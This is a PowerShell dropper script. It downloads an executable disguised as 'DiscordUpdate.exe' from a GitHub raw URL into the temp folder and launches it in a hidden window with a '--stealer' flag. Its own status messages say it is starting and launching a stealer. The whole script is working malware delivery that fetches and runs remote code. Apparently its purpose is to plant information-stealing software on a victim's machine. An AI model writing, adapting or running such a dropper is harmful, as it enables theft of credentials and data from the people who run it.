Write-Host "=== Starting ===" -ForegroundColor Cyan

$exePath = "$env:TEMP\DiscordUpdate.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/main/DiscordUpdate.exe"

Write-Host "Trying to download from: $url" -ForegroundColor Yellow

try {
    (New-Object Net.WebClient).DownloadFile($url, $exePath)
    Write-Host "Download successful! File size: $( (Get-Item $exePath).Length ) bytes" -ForegroundColor Green
    
    Write-Host "Starting stealer..." -ForegroundColor Green
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
    Write-Host "Stealer launched." -ForegroundColor Green
} catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "=== End ===" -ForegroundColor Cyan
Read-Host "Press Enter to close..."
